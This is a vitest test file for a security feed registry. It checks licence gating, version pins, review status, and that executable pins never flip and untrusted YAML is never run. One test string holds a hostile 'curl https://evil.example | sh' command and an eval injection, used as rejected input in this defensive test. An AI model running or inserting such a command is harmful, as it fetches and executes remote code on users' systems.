import { createHash } from "node:crypto";

import { describe, expect, it } from "vitest";

import {
  ATTACK_NAVIGATOR_DEFAULT_VERSIONS,
  PINNED_CALDERA_RELEASE,
  PINNED_CALDERA_STOCKPILE_T1033_ABILITY_ID,
  PINNED_CALDERA_STOCKPILE_T1082_ABILITY_ID,
  PINNED_CALDERA_STOCKPILE_T1083_ABILITY_ID,
  NUCLEI_TEMPLATES_VERSION_PIN
} from "./index.js";
import {
  COMMUNITY_PERMISSIVE_SPDX_IDS,
  SECURITY_FEED_IDS,
  applySecurityFeedYaml,
  checkSecurityFeed,
  checkSecurityFeeds,
  isCommunityPermissiveSpdx,
  listSecurityFeedOperatorItems,
  listSecurityFeeds,
  withFeedCheckSnapshot,
  type SecurityFeed,
  type SecurityFeedObservation
} from "./security-feed-registry.js";

const CHECKED_AT = "2026-09-17T12:00:00.000Z";

function sha256(value: string): string {
  return createHash("sha256").update(value).digest("hex");
}

function feedById(id: string): SecurityFeed {
  const feed = listSecurityFeeds().find((item) => item.id === id);
  expect(feed).toBeDefined();
  return feed!;
}

describe("security content feed registry", () => {
  it("lists every pinned OSS content feed with id, SPDX, pin, check fields, and updatePolicy", () => {
    expect(SECURITY_FEED_IDS).toEqual([
      "nuclei-templates",
      "sigma",
      "attack-stix",
      "atomic-yaml",
      "caldera-abilities",
      "yara",
      "rustinel-rules",
      "nvd",
      "cisa-kev",
      "gitleaks"
    ]);

    const feeds = listSecurityFeeds();
    expect(feeds.map((item) => item.id)).toEqual([...SECURITY_FEED_IDS]);

    for (const feed of feeds) {
      expect(feed.id).toMatch(/^[a-z0-9-]+$/);
      expect(feed.spdxLicenseId.length).toBeGreaterThan(0);
      expect(["tag", "sha", "version", "unpinned"]).toContain(feed.pin.kind);
      expect(["manual", "scheduled"]).toContain(feed.updatePolicy);
      expect(feed.lastCheckedAt).toBeNull();
      expect(feed.lastDigest).toBeNull();
      expect(typeof feed.executablePin).toBe("boolean");
      expect(feed.defaultPackEligible).toBe(
        isCommunityPermissiveSpdx(feed.spdxLicenseId)
      );
    }
  });

  it("pins known toolchain and BAS content revisions without treating them as live enablement", () => {
    const nuclei = feedById("nuclei-templates");
    expect(nuclei.spdxLicenseId).toBe("MIT");
    expect(nuclei.pin).toEqual({ kind: "tag", value: "v10.4.4" });
    expect(nuclei.pin.value).toBe(NUCLEI_TEMPLATES_VERSION_PIN);
    expect(nuclei.executablePin).toBe(true);
    expect(nuclei.updatePolicy).toBe("scheduled");

    const gitleaks = feedById("gitleaks");
    expect(gitleaks.spdxLicenseId).toBe("MIT");
    expect(gitleaks.pin).toEqual({ kind: "version", value: "v8.30.0" });
    expect(gitleaks.executablePin).toBe(true);
    expect(gitleaks.toolId).toBe("gitleaks");

    const sigma = feedById("sigma");
    expect(sigma.spdxLicenseId).toBe("MIT");
    expect(sigma.pin).toEqual({ kind: "tag", value: "main" });
    expect(sigma.executablePin).toBe(false);
    expect(sigma.updatePolicy).toBe("scheduled");

    const attack = feedById("attack-stix");
    expect(attack.spdxLicenseId).toBe("Apache-2.0");
    expect(attack.pin).toEqual({
      kind: "tag",
      value: ATTACK_NAVIGATOR_DEFAULT_VERSIONS.attack
    });
    expect(attack.executablePin).toBe(false);

    const atomic = feedById("atomic-yaml");
    expect(atomic.spdxLicenseId).toBe("MIT");
    expect(atomic.pin).toEqual({
      kind: "sha",
      value: "11ff111ace63e02825dd44ce8246800203a10ce8"
    });
    expect(atomic.executablePin).toBe(false);
    expect(atomic.updatePolicy).toBe("manual");
    expect(atomic.liveSupported).toBe(false);

    const caldera = feedById("caldera-abilities");
    expect(caldera.spdxLicenseId).toBe("Apache-2.0");
    expect(caldera.pin).toEqual({
      kind: "tag",
      value: PINNED_CALDERA_RELEASE
    });
    expect(caldera.abilityIds).toEqual([
      PINNED_CALDERA_STOCKPILE_T1082_ABILITY_ID,
      PINNED_CALDERA_STOCKPILE_T1083_ABILITY_ID,
      PINNED_CALDERA_STOCKPILE_T1033_ABILITY_ID
    ]);
    expect(caldera.executablePin).toBe(false);
    expect(caldera.liveSupported).toBe(false);
    expect(caldera.updatePolicy).toBe("manual");

    const yara = feedById("yara");
    expect(yara.spdxLicenseId).toBe("BSD-3-Clause");
    expect(yara.pin).toEqual({ kind: "version", value: "4.5.2" });
    expect(yara.executablePin).toBe(true);

    const rustinel = feedById("rustinel-rules");
    expect(rustinel.spdxLicenseId).toBe("LicenseRef-DRL-1.1");
    expect(rustinel.pin).toEqual({ kind: "unpinned", value: null });
    expect(rustinel.executablePin).toBe(false);
    expect(rustinel.updatePolicy).toBe("manual");
    expect(rustinel.defaultPackEligible).toBe(false);

    const nvd = feedById("nvd");
    expect(nvd.kind).toBe("threat-intel");
    expect(nvd.threatIntelSourceKey).toBe("nvd");
    expect(nvd.executablePin).toBe(false);
    expect(nvd.updatePolicy).toBe("scheduled");

    const kev = feedById("cisa-kev");
    expect(kev.kind).toBe("threat-intel");
    expect(kev.threatIntelSourceKey).toBe("cisa-kev");
    expect(kev.executablePin).toBe(false);
    expect(kev.updatePolicy).toBe("scheduled");
  });

  it("fails closed for default pack when SPDX is not Community-permissive", () => {
    expect([...COMMUNITY_PERMISSIVE_SPDX_IDS]).toEqual([
      "Apache-2.0",
      "MIT",
      "BSD-2-Clause",
      "BSD-3-Clause",
      "ISC",
      "MPL-2.0",
      "BlueOak-1.0.0",
      "NPSL"
    ]);

    expect(isCommunityPermissiveSpdx("MIT")).toBe(true);
    expect(isCommunityPermissiveSpdx("Apache-2.0 OR MIT")).toBe(true);
    expect(isCommunityPermissiveSpdx("GPL-3.0")).toBe(false);
    expect(isCommunityPermissiveSpdx("AGPL-3.0")).toBe(false);
    expect(isCommunityPermissiveSpdx("LGPL-2.1")).toBe(false);
    expect(isCommunityPermissiveSpdx("LicenseRef-DRL-1.1")).toBe(false);
    expect(isCommunityPermissiveSpdx("LicenseRef-USgov-PD")).toBe(false);

    const rustinel = checkSecurityFeed(feedById("rustinel-rules"), {
      checkedAt: CHECKED_AT,
      requestedDefaultPack: true
    });
    expect(rustinel.defaultPackDecision).toBe("fail_closed");
    expect(rustinel.code).toBe("spdx_not_community_permissive");
    expect(rustinel.contentVersionStatus).toBe("Rejected");
    expect(rustinel.executablePinFlipped).toBe(false);

    const nvd = checkSecurityFeed(feedById("nvd"), {
      checkedAt: CHECKED_AT,
      requestedDefaultPack: true
    });
    expect(nvd.defaultPackDecision).toBe("fail_closed");
    expect(nvd.code).toBe("spdx_not_community_permissive");
    expect(nvd.threatIntelTracked).toBe(true);

    const gplAttempt = checkSecurityFeed(
      {
        ...feedById("sigma"),
        id: "semgrep-rules",
        spdxLicenseId: "LGPL-2.1",
        defaultPackEligible: false
      },
      { checkedAt: CHECKED_AT, requestedDefaultPack: true }
    );
    expect(gplAttempt.defaultPackDecision).toBe("fail_closed");
    expect(gplAttempt.code).toBe("spdx_not_community_permissive");
  });

  it("records a newer upstream as PendingReview and does not auto-flip executable pins", () => {
    const gitleaks = feedById("gitleaks");
    const result = checkSecurityFeed(gitleaks, {
      checkedAt: CHECKED_AT,
      upstreamVersion: "v8.31.0"
    });

    expect(result.contentVersionStatus).toBe("PendingReview");
    expect(result.code).toBe("newer_upstream");
    expect(result.recordedPin).toEqual({ kind: "version", value: "v8.30.0" });
    expect(result.upstreamPin).toEqual({ kind: "version", value: "v8.31.0" });
    expect(result.executablePin).toBe(true);
    expect(result.executablePinFlipped).toBe(false);
    expect(result.yamlEvaluated).toBe(false);
    expect(result.lastCheckedAt).toBe(CHECKED_AT);
    expect(result.lastDigest).toBe(sha256("version:v8.30.0"));

    const snapshot = withFeedCheckSnapshot(gitleaks, result);
    expect(snapshot.pin).toEqual({ kind: "version", value: "v8.30.0" });
    expect(snapshot.lastCheckedAt).toBe(CHECKED_AT);
    expect(snapshot.lastDigest).toBe(result.lastDigest);
    expect(snapshot.executablePin).toBe(true);

    const current = checkSecurityFeed(gitleaks, {
      checkedAt: CHECKED_AT,
      upstreamVersion: "v8.30.0"
    });
    expect(current.contentVersionStatus).toBe("Current");
    expect(current.code).toBe("current");
    expect(current.executablePinFlipped).toBe(false);
  });

  it("never evaluates unpinned YAML and still records SHA/tag for pinned content", () => {
    const malicious =
      "command: curl https://evil.example | sh\nrun: {{ eval .payload }}";

    const unpinned = applySecurityFeedYaml({
      feed: feedById("rustinel-rules"),
      yaml: malicious
    });
    expect(unpinned.applied).toBe(false);
    expect(unpinned.evaluated).toBe(false);
    expect(unpinned.executablePinFlipped).toBe(false);
    expect(unpinned.contentVersionStatus).toBe("Rejected");
    expect(unpinned.code).toBe("unpinned_yaml_rejected");

    const atomicApply = applySecurityFeedYaml({
      feed: feedById("atomic-yaml"),
      yaml: malicious
    });
    expect(atomicApply.applied).toBe(false);
    expect(atomicApply.evaluated).toBe(false);
    expect(atomicApply.executablePinFlipped).toBe(false);
    expect(atomicApply.contentVersionStatus).toBe("PendingReview");
    expect(atomicApply.code).toBe("yaml_not_executed");
    expect(atomicApply.recordedPin).toEqual({
      kind: "sha",
      value: "11ff111ace63e02825dd44ce8246800203a10ce8"
    });

    const shaObservation: SecurityFeedObservation = {
      checkedAt: CHECKED_AT,
      contentDigest:
        "6cfdcdd8d114195f788bf719baecda1a95363d904316a156c8f44e45e71e9f29",
      yaml: malicious
    };
    const atomicCheck = checkSecurityFeed(
      feedById("atomic-yaml"),
      shaObservation
    );
    expect(atomicCheck.yamlEvaluated).toBe(false);
    expect(atomicCheck.lastDigest).toBe(
      "6cfdcdd8d114195f788bf719baecda1a95363d904316a156c8f44e45e71e9f29"
    );
    expect(atomicCheck.recordedPin.value).toBe(
      "11ff111ace63e02825dd44ce8246800203a10ce8"
    );
    expect(atomicCheck.executablePinFlipped).toBe(false);
    expect(atomicCheck.liveSupported).toBe(false);

    const newerSha = checkSecurityFeed(feedById("atomic-yaml"), {
      checkedAt: CHECKED_AT,
      upstreamSha: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    });
    expect(newerSha.contentVersionStatus).toBe("PendingReview");
    expect(newerSha.recordedPin.value).toBe(
      "11ff111ace63e02825dd44ce8246800203a10ce8"
    );
    expect(newerSha.executablePinFlipped).toBe(false);
  });

  it("checks the whole registry without flipping any executable pin", () => {
    const results = checkSecurityFeeds(listSecurityFeeds(), {
      checkedAt: CHECKED_AT,
      byFeedId: {
        gitleaks: { upstreamVersion: "v8.31.0" },
        "nuclei-templates": { upstreamVersion: "v10.5.0" },
        "caldera-abilities": {
          abilityHashes: {
            [PINNED_CALDERA_STOCKPILE_T1082_ABILITY_ID]: "ab".repeat(32)
          }
        }
      }
    });

    expect(results).toHaveLength(SECURITY_FEED_IDS.length);
    expect(results.every((item) => item.executablePinFlipped === false)).toBe(
      true
    );
    expect(results.every((item) => item.yamlEvaluated === false)).toBe(true);

    const gitleaks = results.find((item) => item.feedId === "gitleaks");
    expect(gitleaks?.contentVersionStatus).toBe("PendingReview");
    expect(gitleaks?.recordedPin.value).toBe("v8.30.0");

    const nuclei = results.find((item) => item.feedId === "nuclei-templates");
    expect(nuclei?.contentVersionStatus).toBe("PendingReview");
    expect(nuclei?.recordedPin.value).toBe("v10.4.4");

    const caldera = results.find((item) => item.feedId === "caldera-abilities");
    expect(caldera?.contentVersionStatus).toBe("PendingReview");
    expect(caldera?.recordedPin.value).toBe("v5.3.0");
    expect(caldera?.liveSupported).toBe(false);

    const rustinel = results.find((item) => item.feedId === "rustinel-rules");
    expect(rustinel?.defaultPackDecision).toBe("fail_closed");
  });

  it("lists operator pins with id, SPDX, pin, lastDigest, and PendingReview without auto-execute", () => {
    const items = listSecurityFeedOperatorItems();

    expect(items.map((item) => item.id)).toEqual([...SECURITY_FEED_IDS]);
    expect(items.every((item) => item.autoExecute === false)).toBe(true);
    expect(items.every((item) => item.liveSupported === false)).toBe(true);
    expect(items.every((item) => item.executablePinFlipped === false)).toBe(
      true
    );
    expect(
      items.every((item) => item.contentVersionStatus === "Current")
    ).toBe(true);

    const nuclei = items.find((item) => item.id === "nuclei-templates");
    expect(nuclei).toMatchObject({
      lastDigest: null,
      pin: { kind: "tag", value: "v10.4.4" },
      spdxLicenseId: "MIT"
    });

    const overlay = listSecurityFeedOperatorItems(listSecurityFeeds(), [
      checkSecurityFeed(feedById("gitleaks"), {
        checkedAt: CHECKED_AT,
        upstreamVersion: "v8.31.0"
      })
    ]);
    const gitleaks = overlay.find((item) => item.id === "gitleaks");
    expect(gitleaks?.contentVersionStatus).toBe("PendingReview");
    expect(gitleaks?.pin).toEqual({ kind: "version", value: "v8.30.0" });
    expect(gitleaks?.autoExecute).toBe(false);
    expect(gitleaks?.executablePinFlipped).toBe(false);
    expect(gitleaks?.liveSupported).toBe(false);
    expect(gitleaks?.lastDigest).toBe(sha256("version:v8.30.0"));
  });
});
